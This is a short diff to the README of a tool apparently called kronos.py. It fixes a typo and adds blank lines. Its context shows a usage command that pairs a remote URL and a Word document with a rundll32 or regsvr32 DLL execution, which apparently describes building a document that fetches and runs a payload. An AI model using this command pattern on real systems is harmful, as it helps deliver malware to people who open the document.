@@ -16,7 +16,10 @@ for a dll  use :
 
 python kronos.py -Url 'https://your.link' --word_file 'if you have a docx file' -PE " {rundll32 or regsvr32} {name.dll} ,{function if needed} "
 
-youcan also run a ps1 or bat file 
+you can also run a ps1 or bat file 
+
+
+
 
 setup:
 ------------
